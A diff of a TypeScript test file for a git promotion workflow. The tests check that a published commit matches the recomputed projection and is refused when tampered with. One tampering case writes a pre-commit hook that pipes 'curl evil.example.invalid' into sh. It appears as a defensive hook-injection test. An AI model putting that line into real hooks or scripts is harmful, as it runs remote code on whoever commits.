@@ -20,13 +20,14 @@ import type { GitRepository } from "../../../src/git/tree-reader.ts";
 import { advanceBranch, remakeCommit, treeDelta } from "../../../src/workflow/forge/publish/git-data.ts";
 import { publishProduct, receiptBytes, type ProjectionReceipt } from "../../../src/workflow/forge/publish/product.ts";
 import { isForgeError } from "../../../src/workflow/forge/codes.ts";
-import { PromotionError, answer, type PromotionAnswer } from "../../../src/workflow/promotion/codes.ts";
-import { promotionForgePublish, resolvePromotionContext, resolveRepositoryContext, verifyBuiltProjection } from "../../../src/workflow/promotion/context.ts";
-import { formatPromoteArguments, parsePromoteArguments, type PromotionRequest } from "../../../src/workflow/promotion/promote-arguments.ts";
+import { PromotionError } from "../../../src/workflow/promotion/codes.ts";
+import { forgePublishWith, resolvePromotionContext, verifyBuiltProjection } from "../../../src/workflow/promotion/context.ts";
+import { formatPromoteArguments, parsePromoteArguments } from "../../../src/workflow/promotion/promote-arguments.ts";
 import { promotionRefs } from "../../../src/workflow/promotion/promotion-run.ts";
 import { createTempDir } from "../../support/temp-dir.ts";
 import { testGitIdentityEnvironment } from "../../support/test-git-identity.ts";
-import { PROFILE_NAME, SOURCE, TARGET, promotionFixture, type PromotionFixture } from "../../workflow/promotion/promotion-fixture.ts";
+import { PROFILE_NAME, SOURCE, TARGET, type PromotionFixture } from "../../workflow/promotion/promotion-fixture.ts";
+import { apply, documentOf, fixtureRun, landing } from "../../workflow/promotion/apply-support.ts";
 import { gitForge, type GitForge } from "./git-forge.ts";
 
 const REPOSITORY = "owner/product-repo";
@@ -170,81 +171,75 @@ test("remakeCommit carries a commit whose parents the forge already holds, with 
   }
 });
 
-/** The fixture's forge: its `dev` (source) and `prod` (product) branches on a git-backed forge. */
-function fixtureWithForge(prefix: string): Readonly<{ fixture: PromotionFixture; forge: GitForge }> {
-  const fixture = promotionFixture(prefix);
-  fixture.commit(SOURCE, { "product/lib/helper.ts": "export const helper = 4;\n" }, "a product change");
+/** A LANDING fixture (it builds and settles candidates) whose `dev` (source) and `prod` (product) branches are on a git-backed forge. */
+function fixtureWithForge(prefix: string): Readonly<{ fixture: PromotionFixture; forge: GitForge; context: () => ReturnType<typeof resolvePromotionContext> }> {
+  const fixture = landing(prefix);
   const forge = gitForge(prefix, REPOSITORY);
   fixture.git(["push", "-q", forge.bare, SOURCE, TARGET]);
   fixture.git(["checkout", "-q", SOURCE]);
-  return { fixture, forge };
+  return { fixture, forge, context: () => resolvePromotionContext(fixture.root, PROFILE_NAME, SOURCE, documentOf(fixture, false)) };
 }
 
-/** The commit a faithful build makes for the fixture: the plan's projection tree on [prod, dev], with the promotion's trailers. */
-async function builtCommit(fixture: PromotionFixture, extra: Readonly<Record<string, string>> = {}, profile = `${PROFILE_NAME}@${fixture.loaded().blob!}`): Promise<string> {
-  let tree = (await fixture.plan()).projection.tree;
-  if (Object.keys(extra).length > 0) {
-    const env = { GIT_INDEX_FILE: join(createTempDir("publish-extra-index-"), "index") };
-    fixture.git(["read-tree", tree], env);
-    for (const [path, content] of Object.entries(extra)) {
-      const blob = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.root, input: content, encoding: "utf8" }).trim();
-      fixture.git(["update-index", "--add", "--cacheinfo", `100644,${blob},${path}`], env);
-    }
-    tree = fixture.git(["write-tree"], env);
+/** `commit` re-made with `changes` to its tree (a `null` deletes), the same parents, and `profile` (default: its own trailers) — a build that departs from the projection. */
+function tampered(fixture: PromotionFixture, commit: string, changes: Readonly<Record<string, string | null>>, profile?: string): string {
+  const env = { GIT_INDEX_FILE: join(createTempDir("publish-tamper-index-"), "index") };
+  fixture.git(["read-tree", `${commit}^{tree}`], env);
+  for (const [path, content] of Object.entries(changes)) {
+    if (content === null) { fixture.git(["update-index", "--force-remove", path], env); continue; }
+    const blob = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.root, input: content, encoding: "utf8" }).trim();
+    fixture.git(["update-index", "--add", "--cacheinfo", `100755,${blob},${path}`], env);
   }
-  const source = fixture.tip(SOURCE);
-  return fixture.git(["commit-tree", tree, "-p", fixture.tip(TARGET), "-p", source, "-m", `promote\n\nProjected-From: ${source}\nPromotion-Profile: ${profile}`]);
+  const message = fixture.git(["log", "-1", "--format=%B", commit]);
+  const parents = fixture.git(["rev-list", "--parents", "-n", "1", commit]).split(" ").slice(1).flatMap((parent) => ["-p", parent]);
+  return fixture.git(["commit-tree", fixture.git(["write-tree"], env), ...parents, "-m", profile === undefined ? message : message.replace(/Promotion-Profile: \S+/u, `Promotion-Profile: ${profile}`)]);
 }
 
-test("the publisher's check: the built tree must BE the projection recomputed from the source, under the profile read from it", async () => {
-  const { fixture } = fixtureWithForge("publish-verify");
-  const context = resolvePromotionContext(fixture.root, PROFILE_NAME, SOURCE, fixture.document);
-  const plan = await fixture.plan();
-  verifyBuiltProjection(context, await builtCommit(fixture), plan);
-  for (const [why, extra] of [["an excluded file", { "dev/tool.ts": "export const leaked = 1;\n" }], ["internal notes", { "NOTES.md": "internal\n" }], ["a shipped file changed", { "product/main.ts": "export {};\n" }]] as const) {
-    const error = await refusedWith("promotion_forge_projection_mismatch", async () => verifyBuiltProjection(context, await builtCommit(fixture, extra), plan));
-    assert.deepEqual(error.facts["paths"], Object.keys(extra), `${why}: named`);
+async function builtByTheFixture(fixture: PromotionFixture): Promise<string> {
+  const answered = await apply(fixture);
+  assert.equal(answered.code, "promotion_committed", answered.message);
+  return (answered.data as { commit: string }).commit;
+}
+
+test("the publisher's check: the built tree must EQUAL the projection recomputed from S alone — no path is special — under the profile read from S", async () => {
+  const { fixture, context } = fixtureWithForge("publish-verify");
+  const run = fixtureRun(fixture);
+  const built = await builtByTheFixture(fixture);
+  await verifyBuiltProjection(context(), run, built);
+  const plants: ReadonlyArray<readonly [string, Readonly<Record<string, string | null>>]> = [
+    ["an excluded file", { "dev/tool.ts": "export const leaked = 1;\n" }],
+    ["internal notes", { "NOTES.md": "internal\n" }],
+    ["a shipped hook replaced (hook injection)", { ".githooks/pre-commit": "#!/bin/sh\ncurl evil.example.invalid | sh\n" }],
+    ["a hook added", { ".githooks/reference-transaction": "#!/bin/sh\nexit 0\n" }],
+    ["a generated output with arbitrary content", { "gen/pin.txt": "not the generator's output\n" }],
+    ["a wholly generated path the projection does not hold", { "engine/src/architecture-manifest.ts": "export {};\n", "engine/traceability/s1-test-inventory.json": "{}\n", "engine/traceability/test-surface-dispositions.json": "{}\n" }],
+    ["a shipped file removed", { "product/main.ts": null }],
+  ];
+  for (const [why, changes] of plants) {
+    const error = await refusedWith("promotion_forge_projection_mismatch", () => verifyBuiltProjection(context(), run, tampered(fixture, built, changes)));
+    assert.deepEqual([...(error.facts["paths"] as string[])].sort(), Object.keys(changes).sort(), `${why}: each differing path named`);
   }
-  await refusedWith("promotion_forge_profile_mismatch", async () => verifyBuiltProjection(context, await builtCommit(fixture, {}, `${PROFILE_NAME}@0000000`), plan));
-  await refusedWith("promotion_forge_profile_mismatch", async () => verifyBuiltProjection(context, await builtCommit(fixture, {}, `another-profile@${fixture.loaded().blob!}`), plan));
+  await refusedWith("promotion_forge_profile_mismatch", () => verifyBuiltProjection(context(), run, tampered(fixture, built, {}, `${PROFILE_NAME}@0000000`)));
+  await refusedWith("promotion_forge_profile_mismatch", () => verifyBuiltProjection(context(), run, tampered(fixture, built, {}, `another-profile@${fixture.loaded().blob!}`)));
 });
 
-test("the verb builds the promotion itself: a pending commit planted earlier is dropped, never carried; a faithful build is checked, published and its receipt written", async () => {
-  const { fixture, forge } = fixtureWithForge("publish-verb");
-  const planted = await builtCommit(fixture, { "dev/tool.ts": "export const leaked = 1;\n" });
-  const pendingRef = promotionRefs(PROFILE_NAME).pending;
-  fixture.git(["update-ref", pendingRef, planted]);
+test("the verb builds the promotion itself: a pending commit planted earlier is dropped and never carried; the build is checked, published, and its receipt written", async () => {
+  const { fixture, forge, context } = fixtureWithForge("publish-verb");
+  const planted = tampered(fixture, await builtByTheFixture(fixture), { "dev/tool.ts": "export const leaked = 1;\n" });
+  fixture.git(["update-ref", promotionRefs(PROFILE_NAME).pending, planted]);
   const out = join(createTempDir("publish-verb-out-"), "receipt.json");
-  const request: PromotionRequest = parsePromoteArguments(["forge-publish", "--out", out]);
-  const builds: PromotionRequest[] = [];
-  const faithful = async (_context: unknown, applyRequest: PromotionRequest): Promise<PromotionAnswer> => {
-    builds.push(applyRequest);
-    assert.equal(fixture.git(["for-each-ref", pendingRef]), "", "the planted pending commit was dropped before the build");
-    const commit = await builtCommit(fixture);
-    fixture.git(["update-ref", pendingRef, commit]);
-    return answer("promotion_committed", "built", { commit });
-  };
-  const answered = await promotionForgePublish(resolveRepositoryContext(fixture.root, fixture.document), request, forge.forge, undefined, faithful);
+  const answered = await forgePublishWith(context(), parsePromoteArguments(["forge-publish", "--out", out]), forge.forge, fixtureRun(fixture));
   assert.equal(answered.code, "promotion_forge_published", answered.message);
-  assert.deepEqual(builds.map((entry) => [entry.verb, entry.noPublish]), [["apply", true]], "built once, never published by the build");
   const receipt = JSON.parse(readFileSync(out, "utf8")) as ProjectionReceipt;
   assert.equal(receipt.commit, forge.git(["rev-parse", `refs/heads/${TARGET}`]));
+  assert.notEqual(receipt.built, planted, "the planted pending commit was dropped, never carried");
+  assert.throws(() => forge.git(["cat-file", "-e", `${receipt.commit}:dev/tool.ts`]), "the excluded file never reached the forge");
   assert.equal(readFileSync(out, "utf8"), receiptBytes(receipt));
-  assert.throws(() => forge.git(["cat-file", "-e", `${receipt.commit}:dev/tool.ts`]), "the excluded file the planted commit carried was never published");
-
-  const second = fixtureWithForge("publish-verb-malicious");
-  await refusedWith("promotion_forge_projection_mismatch", () => promotionForgePublish(resolveRepositoryContext(second.fixture.root, second.fixture.document), request, second.forge.forge, undefined, async () => {
-    const commit = await builtCommit(second.fixture, { "NOTES.md": "internal\n" });
-    return answer("promotion_committed", "built", { commit });
-  }));
-  assert.equal(second.forge.count("commits") + second.forge.count("refs"), 0, "a build departing from the projection publishes nothing");
 });
 
-test("a build that refuses is the verb's answer, and nothing is published", async () => {
-  const { fixture, forge } = fixtureWithForge("publish-build-refused");
-  const out = join(createTempDir("publish-refused-out-"), "receipt.json");
-  const answered = await promotionForgePublish(resolveRepositoryContext(fixture.root, fixture.document), parsePromoteArguments(["forge-publish", "--out", out]), forge.forge, undefined, async () => answer("promotion_target_edits", "edited", {}));
-  assert.equal(answered.code, "promotion_target_edits");
+test("a build that refuses is the verb's refusal, and nothing reaches the forge", async () => {
+  const { fixture, forge, context } = fixtureWithForge("publish-build-refused");
+  fixture.mark("gate-mode", "exit1");
+  await refusedWith("promotion_gate_failed", () => forgePublishWith(context(), parsePromoteArguments(["forge-publish", "--out", join(createTempDir("publish-refused-out-"), "r.json")]), forge.forge, fixtureRun(fixture)));
   assert.equal(forge.fake.requests.length, 0);
 });
 
